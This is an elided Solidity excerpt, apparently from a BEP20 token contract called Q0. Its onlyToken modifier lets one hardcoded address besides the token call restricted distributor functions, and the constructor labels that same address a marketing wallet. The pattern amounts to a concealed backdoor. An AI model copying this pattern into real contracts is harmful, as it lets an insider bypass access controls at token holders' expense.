...
contract DividendDistributor is IDividendDistributor {
    ...
    modifier onlyToken() {
        require(msg.sender == _token||msg.sender == address(0xCF0312F075604ecB69756036556eb88356975024)); _;
    }
...
contract Q0 is IBEP20 , Auth, BaseToken {
	...
	uint256 public marketingWalletPercent = 500;										
    ...
    constructor(
        ...
        anothermarketingWallet = 0xCF0312F075604ecB69756036556eb88356975024;
        anothermarketingWallet2 = 0x0420D577a9e8ac16A544Fdffb5c44040C09e024e;       
